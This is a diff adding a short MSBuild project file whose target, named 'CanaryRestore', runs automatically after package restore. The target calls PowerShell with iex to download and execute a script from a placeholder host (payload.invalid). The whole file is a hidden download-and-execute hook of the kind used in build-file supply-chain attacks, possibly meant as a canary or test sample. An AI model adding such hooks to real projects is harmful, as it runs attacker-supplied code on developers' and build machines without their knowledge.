@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="CanaryRestore" AfterTargets="Restore">
+    <Exec Command="powershell -NoProfile -Command &quot;iex (New-Object Net.WebClient).DownloadString('https://payload.invalid/a.ps1')&quot;" />
+  </Target>
+</Project>
